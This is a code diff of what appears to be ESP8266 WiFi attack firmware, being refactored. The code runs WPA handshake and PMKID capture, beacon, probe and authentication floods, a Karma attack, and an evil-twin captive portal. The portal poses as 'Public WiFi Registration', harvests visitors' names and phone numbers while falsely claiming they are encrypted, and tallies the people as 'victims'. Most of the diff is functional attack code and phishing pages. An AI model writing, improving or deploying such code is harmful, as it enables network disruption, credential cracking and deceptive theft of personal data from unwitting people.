-                      " | EAPOL: " + String(state.eapolCount);
-    
-    Serial.println("PMKID STOP:");
-    Serial.println("  Total packets: " + String(state.packetCount));
-    Serial.println("  EAPOL frames: " + String(state.eapolCount));
+    state.pmkidData = String("Stopped - Pkts: ") + String(state.packetCount) +
+                      String(" EAPOL: ") + String(state.eapolCount);
+    Serial.println(String("PMKID STOP | EAPOL: ") + String(state.eapolCount));
   }
-  
-  bool startHandshake(int channel) {
-    if (!Utils::isValidChannel(channel)) {
-      Utils::logError("Invalid channel for handshake capture: " + String(channel));
-      channel = 1;
-    }
-    
-    state.targetChannel = channel;
+
+  bool startHandshake(int ch) {
+    if (!Utils::validChannel(ch)) ch = 1;
+    state.targetChannel = ch;
     wifi_set_channel(state.targetChannel);
-    
-    // Clear previous handshake data
-    for (int i = 0; i < Config::MAX_HANDSHAKES; i++) {
-      state.handshakes[i] = HandshakeData();
-    }
+    for (int i = 0; i < Config::MAX_HANDSHAKES; i++) state.handshakes[i] = HandshakeData();
     state.handshakeCount = 0;
-    
     wifi_set_promiscuous_rx_cb(snifferCallback);
     wifi_promiscuous_enable(1);
-    
     state.handshakeActive = true;
-    state.packetCount = 0;
-    state.eapolCount = 0;
-    state.handshakeData = "Listening on CH " + String(state.targetChannel) + " - Waiting for WPA handshakes";
-    
-    Serial.println("HANDSHAKE CAPTURE START:");
-    Serial.println("  Channel: " + String(channel));
-    Serial.println("  Waiting for 4-way handshake...");
-    
+    state.channelHop      = false;
+    v_packetCount = 0;
+    v_eapolCount  = 0;
+    state.handshakeData = String("Listening on CH ") + String(ch);
+    Serial.println(String("HANDSHAKE START | CH: ") + String(ch));
     return true;
   }
-  
+
   void stopHandshake() {
     if (!state.handshakeActive) return;
-    
     state.handshakeActive = false;
+    state.channelHop      = false;
     wifi_promiscuous_enable(0);
-    
-    state.handshakeData = "Stopped - Packets: " + String(state.packetCount) + 
-                          " | EAPOL: " + String(state.eapolCount) + 
-                          " | Handshakes: " + String(state.handshakeCount);
-    
-    Serial.println("HANDSHAKE CAPTURE STOP:");
-    Serial.println("  Total packets: " + String(state.packetCount));
-    Serial.println("  EAPOL frames: " + String(state.eapolCount));
-    Serial.println("  Complete handshakes: " + String(state.handshakeCount));
+    state.handshakeData = String("Stopped - EAPOL: ") + String(state.eapolCount) +
+                          String(" Handshakes: ") + String(state.handshakeCount);
+    Serial.println(String("HANDSHAKE STOP | Complete: ") + String(state.handshakeCount));
   }
-  
-  bool startSniffer(int channel) {
-    if (!Utils::isValidChannel(channel)) {
-      Utils::logError("Invalid channel for sniffer: " + String(channel));
-      channel = 1;
-    }
-    
-    state.targetChannel = channel;
+
+  bool startSniffer(int ch) {
+    if (!Utils::validChannel(ch)) ch = 1;
+    state.targetChannel = ch;
     wifi_set_channel(state.targetChannel);
-    
     wifi_set_promiscuous_rx_cb(snifferCallback);
     wifi_promiscuous_enable(1);
-    
     state.snifferActive = true;
-    state.packetCount = 0;
-    
-    Serial.println("SNIFFER START on channel " + String(channel));
+    state.channelHop    = false;
+    v_packetCount = 0;
+    Serial.println(String("SNIFFER START | CH: ") + String(ch));
     return true;
   }
-  
+
   void stopSniffer() {
     if (!state.snifferActive) return;
-    
     state.snifferActive = false;
+    state.channelHop    = false;
     wifi_promiscuous_enable(0);
-    
-    Serial.println("SNIFFER STOP - Total packets: " + String(state.packetCount));
+    Serial.println(String("SNIFFER STOP | Pkts: ") + String(state.packetCount));
   }
-  
+
   bool startPortal(String fakeSSID) {
-    if (fakeSSID.length() == 0) {
-      fakeSSID = "Free_WiFi";
-    }
-    fakeSSID = Utils::sanitizeString(fakeSSID);
-    
-    if (fakeSSID.length() == 0) {
-      Utils::logError("Invalid SSID after sanitization");
-      return false;
-    }
-    
-    if (state.pmkidActive) stopPMKID();
-    if (state.snifferActive) stopSniffer();
-    if (state.handshakeActive) stopHandshake();
-    
+    if (fakeSSID.length() == 0) fakeSSID = String("Free_WiFi");
+    fakeSSID = Utils::sanitizeAlphaNum(fakeSSID);
+    if (fakeSSID.length() == 0) { Utils::logError("Bad portal SSID"); return false; }
+    if (state.pmkidActive)      stopPMKID();
+    if (state.snifferActive)    stopSniffer();
+    if (state.handshakeActive)  stopHandshake();
+    if (state.karmaActive)      ::stopKarma();
+
+    WiFi.mode(WIFI_AP);
     WiFi.softAP(fakeSSID.c_str(), "");
     delay(100);
-    
+
     if (state.dnsServer->start(Config::DNS_PORT, "*", WiFi.softAPIP())) {
-      state.dnsActive = true;
-      state.portalActive = true;
-      state.credentialCount = 0;
+      state.dnsActive        = true;
+      state.portalActive     = true;
+      state.credentialCount  = 0;
       state.currentPortalSSID = fakeSSID;
-      state.credentialData = "Active as: " + fakeSSID + " | Waiting for victims...";
-      
-      Serial.println("PORTAL START:");
-      Serial.println("  Fake SSID: " + fakeSSID);
-      Serial.println("  Portal IP: " + WiFi.softAPIP().toString());
-      Serial.println("  Admin Panel: " + WiFi.softAPIP().toString() + ":" + String(Config::ADMIN_PORT));
-      
+      state.credentialData   = String("Active as: ") + fakeSSID;
+      Serial.println(String("PORTAL START | SSID: ") + fakeSSID + String(" IP: ") + WiFi.softAPIP().toString());
       return true;
     }
-    
-    Utils::logError("Failed to start DNS server");
+    Utils::logError("DNS start failed");
     return false;
   }
-  
+
   void stopPortal() {
     if (!state.portalActive) return;
-    
     state.portalActive = false;
-    state.dnsActive = false;
+    state.dnsActive    = false;
     state.dnsServer->stop();
-    
     WiFi.softAP(Config::AP_SSID, Config::AP_PASSWORD);
     delay(100);
-    
-    state.credentialData = "Stopped - Captured: " + String(state.credentialCount) + " victim(s)";
-    
-    Serial.println("PORTAL STOP:");
-    Serial.println("  Victims captured: " + String(state.credentialCount));
+    state.credentialData = String("Stopped - Captured: ") + String(state.credentialCount);
+    Serial.println(String("PORTAL STOP | Victims: ") + String(state.credentialCount));
   }
-  
-  bool startBeaconFlood(int channel, const String& ssid = "") {
-    if (!Utils::isValidChannel(channel)) {
-      Utils::logError("Invalid channel for beacon flood: " + String(channel));
-      channel = 1;
-    }
-    
-    state.targetChannel = channel;
+
+  bool startBeaconFlood(int ch, const String& ssid = "") {
+    if (!Utils::validChannel(ch)) ch = 1;
+    state.targetChannel    = ch;
+    state.targetSSID       = ssid.length() ? ssid : String("FakeAP");
     wifi_set_channel(state.targetChannel);
-    
     state.beaconFloodActive = true;
-    state.beaconCount = 0;
-    state.targetSSID = ssid.length() > 0 ? ssid : "FakeAP";
-    
-    // Set random source MAC for beacon frames
-    Utils::generateRandomMAC(state.targetBSSID);
-    
-    state.beaconData = "Started on CH " + String(state.targetChannel) + " | SSID: " + state.targetSSID;
-    
-    Serial.println("BEACON FLOOD START:");
-    Serial.println("  Channel: " + String(channel));
-    Serial.println("  SSID: " + state.targetSSID);
-    
+    state.beaconCount       = 0;
+    Utils::randomMAC(state.targetBSSID);
+    state.beaconData = String("Started CH ") + String(ch) + String(" | ") + state.targetSSID;
+    Serial.println(String("BEACON START | CH: ") + String(ch));
     return true;
   }
-  
+
   void stopBeaconFlood() {
     if (!state.beaconFloodActive) return;
-    
     state.beaconFloodActive = false;
-    state.beaconData = "Stopped - Total beacons: " + String(state.beaconCount);
-    
-    Serial.println("BEACON FLOOD STOP - Total beacons: " + String(state.beaconCount));
+    state.beaconData = String("Stopped - Total: ") + String(state.beaconCount);
+    Serial.println(String("BEACON STOP | Total: ") + String(state.beaconCount));
   }
-  
-  void sendBeaconPacket() {
+
+  void sendBeacon() {
     if (!state.beaconFloodActive) return;
-    
-    // Update timestamp
-    uint32_t timestamp = millis();
-    memcpy(&Packets::beaconFrame[24], &timestamp, 4);
-    
-    // Update SSID
-    uint8_t ssidLen = state.targetSSID.length();
-    Packets::beaconFrame[38] = ssidLen;
-    memcpy(&Packets::beaconFrame[39], state.targetSSID.c_str(), ssidLen);
-    
-    // Update BSSID and source MAC
+    uint32_t ts = millis();
+    memcpy(&Packets::beaconFrame[24], &ts, 4);
+    uint8_t slen = min((int)state.targetSSID.length(), 32);
+    Packets::beaconFrame[36] = 0x00;
+    Packets::beaconFrame[37] = slen;
+    memcpy(&Packets::beaconFrame[38], state.targetSSID.c_str(), slen);
     memcpy(&Packets::beaconFrame[10], state.targetBSSID, 6);
     memcpy(&Packets::beaconFrame[16], state.targetBSSID, 6);
-    
-    // Calculate frame length
-    uint16_t frameLen = 39 + ssidLen + 13;  // Base length + SSID + fixed parameters
-    
-    // Send packet
-    int result = wifi_send_pkt_freedom(Packets::beaconFrame, frameLen, 0);
-    
-    if (result == 0) {
+    state.seqNumber += Config::SEQ_INCREMENT;
+    Utils::setSeq(Packets::beaconFrame, state.seqNumber);
+    uint16_t frameLen = 38 + slen + 2 + 10 + 3 + 5;
+    if (wifi_send_pkt_freedom(Packets::beaconFrame, frameLen, 0) == 0) {
       state.beaconCount++;
-      
-      if (state.beaconCount % 50 == 0) {
-        state.beaconData = "Active - Sent: " + String(state.beaconCount) + " beacons | CH: " + 
-                           String(state.targetChannel) + " | SSID: " + state.targetSSID;
-      }
+      if (state.beaconCount % 50 == 0)
+        state.beaconData = String("Active - ") + String(state.beaconCount) + String(" beacons");
     }
   }
-  
-  bool startProbeFlood(int channel, const String& ssid = "") {
-    if (!Utils::isValidChannel(channel)) {
-      Utils::logError("Invalid channel for probe flood: " + String(channel));
-      channel = 1;
-    }
-    
-    state.targetChannel = channel;
+
+  bool startProbeFlood(int ch, const String& ssid = "") {
+    if (!Utils::validChannel(ch)) ch = 1;
+    state.targetChannel    = ch;
+    state.targetSSID       = ssid.length() ? ssid : String("TargetNetwork");
     wifi_set_channel(state.targetChannel);
-    
     state.probeFloodActive = true;
-    state.probeCount = 0;
-    state.targetSSID = ssid.length() > 0 ? ssid : "TargetNetwork";
-    
-    // Set random source MAC for probe frames
-    Utils::generateRandomMAC(state.targetBSSID);
-    
-    state.probeData = "Started on CH " + String(state.targetChannel) + " | SSID: " + state.targetSSID;
-    
-    Serial.println("PROBE FLOOD START:");
-    Serial.println("  Channel: " + String(channel));
-    Serial.println("  SSID: " + state.targetSSID);
-    
+    state.probeCount       = 0;
+    Utils::randomMAC(state.targetBSSID);
+    state.probeData = String("Started CH ") + String(ch) + String(" | ") + state.targetSSID;
+    Serial.println(String("PROBE START | CH: ") + String(ch));
     return true;
   }
-  
+
   void stopProbeFlood() {
     if (!state.probeFloodActive) return;
-    
     state.probeFloodActive = false;
-    state.probeData = "Stopped - Total probes: " + String(state.probeCount);
-    
-    Serial.println("PROBE FLOOD STOP - Total probes: " + String(state.probeCount));
+    state.probeData = String("Stopped - Total: ") + String(state.probeCount);
   }
-  
-  void sendProbePacket() {
+
+  void sendProbe() {
     if (!state.probeFloodActive) return;
-    
-    // Update SSID
-    uint8_t ssidLen = state.targetSSID.length();
-    Packets::probeRequestFrame[24] = ssidLen;
-    memcpy(&Packets::probeRequestFrame[25], state.targetSSID.c_str(), ssidLen);
-    
-    // Update source MAC
+    uint8_t slen = min((int)state.targetSSID.length(), 32);
+    Packets::probeRequestFrame[24] = 0x00;
+    Packets::probeRequestFrame[25] = slen;
+    memcpy(&Packets::probeRequestFrame[26], state.targetSSID.c_str(), slen);
     memcpy(&Packets::probeRequestFrame[10], state.targetBSSID, 6);
-    
-    // Calculate frame length
-    uint16_t frameLen = 25 + ssidLen + 10;  // Base length + SSID + supported rates
-    
-    // Send packet
-    int result = wifi_send_pkt_freedom(Packets::probeRequestFrame, frameLen, 0);
-    
-    if (result == 0) {
+    state.seqNumber += Config::SEQ_INCREMENT;
+    Utils::setSeq(Packets::probeRequestFrame, state.seqNumber);
+    uint16_t frameLen = 26 + slen + 10;
+    if (wifi_send_pkt_freedom(Packets::probeRequestFrame, frameLen, 0) == 0) {
       state.probeCount++;
-      
-      if (state.probeCount % 50 == 0) {
-        state.probeData = "Active - Sent: " + String(state.probeCount) + " probes | CH: " + 
-                          String(state.targetChannel) + " | SSID: " + state.targetSSID;
-      }
+      if (state.probeCount % 50 == 0)
+        state.probeData = String("Active - ") + String(state.probeCount) + String(" probes");
     }
   }
-  
-  bool startAuthFlood(const String& mac, int channel) {
-    if (mac.length() == 0) {
-      Utils::logError("Empty MAC address for auth flood");
-      return false;
-    }
-    
-    if (!Utils::parseMACAddress(mac, state.targetBSSID)) {
-      return false;
-    }
-    
-    if (!Utils::isValidChannel(channel)) {
-      Utils::logError("Invalid channel for auth flood: " + String(channel));
-      channel = 1;
-    }
-    
-    state.targetChannel = channel;
+
+  bool startAuthFlood(const String& mac, int ch) {
+    if (mac.length() == 0) { Utils::logError("Empty MAC for auth"); return false; }
+    if (!Utils::parseMAC(mac, state.targetBSSID)) return false;
+    if (!Utils::validChannel(ch)) ch = 1;
+    state.targetChannel    = ch;
     wifi_set_channel(state.targetChannel);
-    
-    state.authFloodActive = true;
-    state.authCount = 0;
-    
-    // Set random source MAC for auth frames
-    Utils::generateRandomMAC(state.targetBSSID);
-    
-    state.authData = "Started on CH " + String(state.targetChannel) + " | Target: " + mac;
-    
-    Serial.println("AUTH FLOOD START:");
-    Serial.println("  Channel: " + String(channel));
-    Serial.println("  Target: " + mac);
-    
+    state.authFloodActive  = true;
+    state.authCount        = 0;
+    Utils::randomMAC(state.targetBSSID);
+    state.authData = String("Started CH ") + String(ch) + String(" | Target: ") + mac;
+    Serial.println(String("AUTH START | CH: ") + String(ch));
     return true;
   }
-  
+
   void stopAuthFlood() {
     if (!state.authFloodActive) return;
-    
     state.authFloodActive = false;
-    state.authData = "Stopped - Total auths: " + String(state.authCount);
-    
-    Serial.println("AUTH FLOOD STOP - Total auths: " + String(state.authCount));
+    state.authData = String("Stopped - Total: ") + String(state.authCount);
   }
-  
-  void sendAuthPacket() {
+
+  void sendAuth() {
     if (!state.authFloodActive) return;
-    
-    // Update source MAC with random value
-    Utils::generateRandomMAC(&Packets::authFrame[10]);
-    
-    // Send packet
-    int result = wifi_send_pkt_freedom(Packets::authFrame, sizeof(Packets::authFrame), 0);
-    
-    if (result == 0) {
+    Utils::randomMAC(&Packets::authFrame[10]);
+    memcpy(&Packets::authFrame[16], state.targetBSSID, 6);
+    state.seqNumber += Config::SEQ_INCREMENT;
+    Utils::setSeq(Packets::authFrame, state.seqNumber);
+    if (wifi_send_pkt_freedom(Packets::authFrame, sizeof(Packets::authFrame), 0) == 0) {
       state.authCount++;
-      
-      if (state.authCount % 50 == 0) {
-        state.authData = "Active - Sent: " + String(state.authCount) + " auths | CH: " + 
-                         String(state.targetChannel);
-      }
+      if (state.authCount % 50 == 0)
+        state.authData = String("Active - ") + String(state.authCount) + String(" auths");
     }
   }
-  
-  bool startKarma(const String& ssid = "") {
-    if (ssid.length() == 0) {
-      Utils::logError("Empty SSID for Karma attack");
-      return false;
-    }
-    
+
+  bool startKarma(const String& ssid) {
+    if (ssid.length() == 0) { Utils::logError("Empty Karma SSID"); return false; }
     state.targetSSID = ssid;
     state.karmaActive = true;
-    state.karmaCount = 0;
-    
-    // Set BSSID for Karma attack
-    Utils::generateRandomMAC(state.targetBSSID);
-    
-    // Start promiscuous mode to capture probe requests
+    state.karmaCount  = 0;
+    v_karmaQueueCount = 0;
+    Utils::randomMAC(state.targetBSSID);
     wifi_set_promiscuous_rx_cb(snifferCallback);
     wifi_promiscuous_enable(1);
-    
-    state.karmaData = "Started - Responding to probes for: " + state.targetSSID;
-    
-    Serial.println("KARMA ATTACK START:");
-    Serial.println("  Responding to probes for: " + state.targetSSID);
-    
+    state.karmaData = String("Started - Responding for: ") + ssid;
+    Serial.println(String("KARMA START | SSID: ") + ssid);
     return true;
   }
-  
+
   void stopKarma() {
     if (!state.karmaActive) return;
-    
     state.karmaActive = false;
     wifi_promiscuous_enable(0);
-    
-    state.karmaData = "Stopped - Total responses: " + String(state.karmaCount);
-    
-    Serial.println("KARMA ATTACK STOP - Total responses: " + String(state.karmaCount));
+    state.karmaData = String("Stopped - Responses: ") + String(state.karmaCount);
+    Serial.println(String("KARMA STOP | Total: ") + String(state.karmaCount));
   }
-  
-  void stopAllAttacks() {
-    if (state.deauthActive) stopDeauth();
-    if (state.pmkidActive) stopPMKID();
-    if (state.handshakeActive) stopHandshake();
-    if (state.portalActive) stopPortal();
-    if (state.snifferActive) stopSniffer();
+
+  void stopAll() {
+    if (state.deauthActive)      stopDeauth();
+    if (state.pmkidActive)       stopPMKID();
+    if (state.handshakeActive)   stopHandshake();
+    if (state.portalActive)      stopPortal();
+    if (state.snifferActive)     stopSniffer();
     if (state.beaconFloodActive) stopBeaconFlood();
-    if (state.probeFloodActive) stopProbeFlood();
-    if (state.authFloodActive) stopAuthFlood();
-    if (state.karmaActive) stopKarma();
-    
-    Serial.println("All attacks stopped");
+    if (state.probeFloodActive)  stopProbeFlood();
+    if (state.authFloodActive)   stopAuthFlood();
+    if (state.karmaActive)       ::stopKarma();
+    Serial.println(F("All attacks stopped"));
   }
 }
 
+// Global stopKarma that calls into namespace
+void stopKarma() { Attacks::stopKarma(); }
+
+// ---------- HTML Fragments ----------
+
+static const char DASH_CSS[] PROGMEM = R"rawliteral(
+body{margin:0;padding:10px;font-family:'Courier New',monospace;background:#0a0e27;color:#0f0}
+.w{max-width:1200px;margin:0 auto}h1{text-align:center;color:#0f0;font-size:1.8em;margin:15px 0;text-shadow:0 0 10px #0f0}
+.b{background:#0f1419;border:2px solid #0f0;border-radius:8px;padding:15px;margin:10px 0;box-shadow:0 0 15px rgba(0,255,0,.2)}
+.a{border-color:#f00;background:#1a0000;box-shadow:0 0 15px rgba(255,0,0,.3)}
+.warn{background:#ff0;color:#000;padding:10px;text-align:center;font-weight:bold;margin:10px 0;border-radius:5px;animation:pulse 1s infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.7}}
+.g{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:8px;margin:12px 0}
+.btn{padding:12px;text-align:center;border:2px solid;border-radius:6px;text-decoration:none;display:block;font-size:.95em;font-weight:bold;transition:all .3s;cursor:pointer}
+.c1{background:#001a1a;color:#0ff;border-color:#0ff}.c1:hover{background:#0ff;color:#000}
+.c2{background:#1a1a00;color:#ff0;border-color:#ff0}.c2:hover{background:#ff0;color:#000}
+.c3{background:#1a0000;color:#f00;border-color:#f00}.c3:hover{background:#f00;color:#fff}
+.c4{background:#1a001a;color:#f0f;border-color:#f0f}.c4:hover{background:#f0f;color:#fff}
+table{width:100%;border-collapse:collapse;font-size:.85em;margin:10px 0}
+th,td{border:1px solid #0f0;padding:8px;text-align:left}th{background:#001a00}
+.mn{padding:4px 8px;background:#0a5;color:#fff;border:none;border-radius:4px;cursor:pointer;font-size:.75em}
+.mn:hover{background:#0c7}
+.st{display:inline-block;margin:5px 10px;padding:8px 15px;background:#001a00;border-radius:5px;border:1px solid #0f0;color:#0f0}
+.badge{background:#f00;color:#fff;padding:2px 6px;border-radius:10px;font-size:.8em;margin-left:5px}
+.err{color:#f00;font-size:.9em;margin-top:10px}
+select{background:#000;color:#0f0;border:1px solid #0f0;padding:5px}
+.off{opacity:.5;cursor:not-allowed}
+)rawliteral";
+
+static const char PORTAL_CSS[] PROGMEM = R"rawliteral(
+body{margin:0;padding:20px;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif;
+background:linear-gradient(135deg,#667eea,#764ba2);min-height:100vh;display:flex;align-items:center;justify-content:center}
+.ct{background:#fff;padding:40px;border-radius:12px;box-shadow:0 20px 60px rgba(0,0,0,.3);max-width:400px;width:100%}
+h2{margin:0 0 10px;color:#333;text-align:center;font-size:24px}.sub{text-align:center;color:#666;margin-bottom:30px;font-size:14px}
+input{width:100%;padding:14px;margin:12px 0;border:2px solid #e0e0e0;border-radius:8px;box-sizing:border-box;font-size:15px;transition:border .3s}
+input:focus{border-color:#667eea;outline:none}
+button{width:100%;padding:16px;background:#667eea;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;transition:background .3s}
+button:hover{background:#5568d3}.info{margin-top:20px;text-align:center;color:#888;font-size:12px}.logo{text-align:center;margin-bottom:20px;font-size:48px}
+)rawliteral";
+
+static const char ADMIN_CSS[] PROGMEM = R"rawliteral(
+body{font-family:'Courier New',monospace;background:#1a0000;color:#f00;padding:20px;margin:0}
+.w{max-width:1000px;margin:0 auto}h1{color:#f00;text-shadow:0 0 15px #f00;text-align:center;font-size:2em;border-bottom:2px solid #f00;padding-bottom:10px}
+.b{background:#0f1419;padding:15px;border:2px solid #f00;border-radius:8px;margin:20px 0;box-shadow:0 0 20px rgba(255,0,0,.3)}
+.cd{background:#0f1419;padding:15px;margin:10px 0;border-radius:8px;border-left:5px solid #f00;box-shadow:0 0 15px rgba(255,0,0,.2);word-wrap:break-word}
+.cnt{color:#ff0;font-size:1.3em;text-align:center;margin:20px 0;padding:15px;background:#1a1a00;border:2px solid #ff0;border-radius:8px}
+.empty{text-align:center;color:#ff0;padding:40px;font-size:1.1em}
+.g{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:10px;margin:20px 0}
+.btn{padding:15px;text-align:center;border:2px solid;border-radius:8px;text-decoration:none;display:block;font-weight:bold;transition:all .3s;cursor:pointer}
+.e1{background:#001a1a;color:#0ff;border-color:#0ff}.e1:hover{background:#0ff;color:#000}
+.e2{background:#1a0000;color:#f00;border-color:#f00}.e2:hover{background:#f00;color:#fff}
+.e3{background:#1a1a00;color:#ff0;border-color:#ff0}.e3:hover{background:#ff0;color:#000}
+textarea{width:100%;min-height:300px;background:#000;color:#0f0;border:2px solid #0f0;padding:10px;font-family:'Courier New',monospace;font-size:.9em;border-radius:5px}
+.xs{margin:20px 0;display:none}.xs.show{display:block}
+)rawliteral";
+
+static const char HS_CSS[] PROGMEM = R"rawliteral(
+body{font-family:'Courier New',monospace;background:#0a0e27;color:#0f0;padding:20px;margin:0}
+.w{max-width:1000px;margin:0 auto}h1{color:#0f0;text-shadow:0 0 10px #0f0;text-align:center;font-size:2em;border-bottom:2px solid #0f0;padding-bottom:10px}
+.b{background:#0f1419;padding:15px;border:2px solid #0f0;border-radius:8px;margin:20px 0;box-shadow:0 0 20px rgba(0,255,0,.3)}
+.hs{background:#0f1419;padding:15px;margin:10px 0;border-radius:8px;border-left:5px solid #0f0;box-shadow:0 0 15px rgba(0,255,0,.2);word-wrap:break-word}
+.cnt{color:#ff0;font-size:1.3em;text-align:center;margin:20px 0;padding:15px;background:#1a1a00;border:2px solid #ff0;border-radius:8px}
+.empty{text-align:center;color:#ff0;padding:40px;font-size:1.1em}
+.g{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:10px;margin:20px 0}
+.btn{padding:15px;text-align:center;border:2px solid;border-radius:8px;text-decoration:none;display:block;font-weight:bold;transition:all .3s;cursor:pointer}
+.e1{background:#001a1a;color:#0ff;border-color:#0ff}.e1:hover{background:#0ff;color:#000}
+.e2{background:#1a0000;color:#f00;border-color:#f00}.e2:hover{background:#f00;color:#fff}
+.e3{background:#1a1a00;color:#ff0;border-color:#ff0}.e3:hover{background:#ff0;color:#000}
+textarea{width:100%;min-height:300px;background:#000;color:#0f0;border:2px solid #0f0;padding:10px;font-family:'Courier New',monospace;font-size:.9em;border-radius:5px}
+.xs{margin:20px 0;display:none}.xs.show{display:block}
+)rawliteral";
+
 namespace HTML {
-  String getCaptivePortal() {
-    String html = "<!DOCTYPE html><html><head>";
-    html += "<meta name='viewport' content='width=device-width,initial-scale=1'>";
-    html += "<meta charset='UTF-8'>";
-    html += "<title>Public WiFi Registration</title><style>";
-    html += "body{margin:0;padding:20px;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif;";
-    html += "background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;align-items:center;justify-content:center}";
-    html += ".container{background:#fff;padding:40px;border-radius:12px;box-shadow:0 20px 60px rgba(0,0,0,0.3);max-width:400px;width:100%}";
-    html += "h2{margin:0 0 10px;color:#333;text-align:center;font-size:24px}";
-    html += ".subtitle{text-align:center;color:#666;margin-bottom:30px;font-size:14px}";
-    html += "input{width:100%;padding:14px;margin:12px 0;border:2px solid #e0e0e0;border-radius:8px;box-sizing:border-box;font-size:15px;transition:border 0.3s}";
-    html += "input:focus{border-color:#667eea;outline:none}";
-    html += "button{width:100%;padding:16px;background:#667eea;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;transition:background 0.3s}";
-    html += "button:hover{background:#5568d3}";
-    html += ".info{margin-top:20px;text-align:center;color:#888;font-size:12px}";
-    html += ".logo{text-align:center;margin-bottom:20px;font-size:48px}";
-    html += "</style></head><body>";
-    html += "<div class='container'>";
-    html += "<div class='logo'>📱</div>";
-    html += "<h2>Public WiFi Registration</h2>";
-    html += "<div class='subtitle'>Enter your details to access to network</div>";
-    html += "<form method='POST' action='/submit'>";
-    html += "<input name='name' placeholder='Full Name' required autocomplete='off' maxlength='32'>";
-    html += "<input name='mobile' type='tel' placeholder='Mobile Number' required autocomplete='off' maxlength='15' pattern='[0-9]{10,15}'>";
-    html += "<button type='submit'>Connect to Network</button>";
-    html += "</form>";
-    html += "<div class='info'>🔒 Your information is encrypted and secure</div>";
-    html += "</div></body></html>";
-    return html;
+
+  String captivePortal() {
+    String h;
+    h.reserve(1200);
+    h += FPSTR(PORTAL_CSS);
+    String page;
+    page.reserve(1400);
+    page = String("<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>"
+           "<meta charset='UTF-8'><title>Public WiFi Registration</title><style>") + h + String("</style></head><body><div class='ct'><div class='logo'>&#128241;</div>"
+           "<h2>Public WiFi Registration</h2><div class='sub'>Enter your details to access the network</div>"
+           "<form method='POST' action='/submit'>"
+           "<input name='name' placeholder='Full Name' required autocomplete='off' maxlength='32'>"
+           "<input name='mobile' type='tel' placeholder='Mobile Number' required autocomplete='off' maxlength='15' pattern='[0-9]{10,15}'>"
+           "<button type='submit'>Connect to Network</button></form>"
+           "<div class='info'>&#128274; Your information is encrypted and secure</div></div></body></html>");
+    return page;
   }
-  
-  String getSuccessPage() {
-    String html = "<!DOCTYPE html><html><head><meta charset='UTF-8'><style>";
-    html += "body{font-family:Arial;background:#667eea;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}";
-    html += ".box{background:#fff;padding:50px;border-radius:12px;text-align:center;box-shadow:0 10px 40px rgba(0,0,0,0.2)}";
-    html += "h2{color:#2ecc71;margin:0 0 15px;font-size:28px}";
-    html += "p{color:#666;margin:0;font-size:16px}";
-    html += ".check{font-size:60px;color:#2ecc71;margin-bottom:20px}";
-    html += "</style></head><body><div class='box'>";
-    html += "<div class='check'>✓</div>";
-    html += "<h2>Registration Successful</h2>";
-    html += "<p>Your device is now connected to the network</p>";
-    html += "</div></body></html>";
-    return html;
+
+  String successPage() {
+    return String("<!DOCTYPE html><html><head><meta charset='UTF-8'><meta http-equiv='refresh' content='5;url=/'><style>"
+           "body{font-family:Arial;background:#667eea;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}"
+           ".box{background:#fff;padding:50px;border-radius:12px;text-align:center;box-shadow:0 10px 40px rgba(0,0,0,.2)}"
+           "h2{color:#2ecc71;font-size:28px}p{color:#666;font-size:16px}.ck{font-size:60px;color:#2ecc71;margin-bottom:20px}"
+           "</style></head><body><div class='box'><div class='ck'>&#10003;</div>"
+           "<h2>Registration Successful</h2><p>Your device is now connected</p></div></body></html>");
   }
-  
-  String getHandshakePage() {
-    String page = "<!DOCTYPE html><html><head>";
-    page += "<meta name='viewport' content='width=device-width,initial-scale=1'>";
-    page += "<meta charset='UTF-8'>";
-    page += "<title>Handshake Capture</title><style>";
-    page += "body{font-family:'Courier New',monospace;background:#0a0e27;color:#0f0;padding:20px;margin:0}";
-    page += ".wrap{max-width:1000px;margin:0 auto}";
-    page += "h1{color:#0f0;text-shadow:0 0 10px #0f0;text-align:center;font-size:2em;border-bottom:2px solid #0f0;padding-bottom:10px}";
-    page += ".info{background:#0f1419;padding:15px;border:2px solid #0f0;border-radius:8px;margin:20px 0;box-shadow:0 0 20px rgba(0,255,0,0.3)}";
-    page += ".handshake{background:#0f1419;padding:15px;margin:10px 0;border-radius:8px;border-left:5px solid #0f0;box-shadow:0 0 15px rgba(0,255,0,0.2);word-wrap:break-word}";
-    page += ".count{color:#ff0;font-size:1.3em;text-align:center;margin:20px 0;padding:15px;background:#1a1a00;border:2px solid #ff0;border-radius:8px}";
-    page += ".time{color:#0ff;font-size:0.85em}";
-    page += ".empty{text-align:center;color:#ff0;padding:40px;font-size:1.1em}";
-    page += ".btn-group{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:10px;margin:20px 0}";
-    page += ".btn{padding:15px;text-align:center;border:2px solid;border-radius:8px;text-decoration:none;display:block;font-weight:bold;transition:all 0.3s;cursor:pointer}";
-    page += ".btn-export{background:#001a1a;color:#0ff;border-color:#0ff}";
-    page += ".btn-export:hover{background:#0ff;color:#000}";
-    page += ".btn-clear{background:#1a0000;color:#f00;border-color:#f00}";
-    page += ".btn-clear:hover{background:#f00;color:#fff}";
-    page += ".btn-back{background:#1a1a00;color:#ff0;border-color:#ff0}";
-    page += ".btn-back:hover{background:#ff0;color:#000}";
-    page += ".stat{display:inline-block;margin:10px;padding:10px 20px;background:#0a0e27;border-radius:5px;border:1px solid #0f0;color:#0f0}";
-    page += "textarea{width:100%;min-height:300px;background:#000;color:#0f0;border:2px solid #0f0;padding:10px;font-family:'Courier New',monospace;font-size:0.9em;border-radius:5px}";
-    page += ".export-section{margin:20px 0;display:none}";
-    page += ".export-section.show{display:block}";
-    page += "</style></head><body><div class='wrap'>";
-    
-    page += "<h1>🔐 HANDSHAKE CAPTURE</h1>";
-    
-    if (state.handshakeActive) {
-      page += "<div class='info'>";
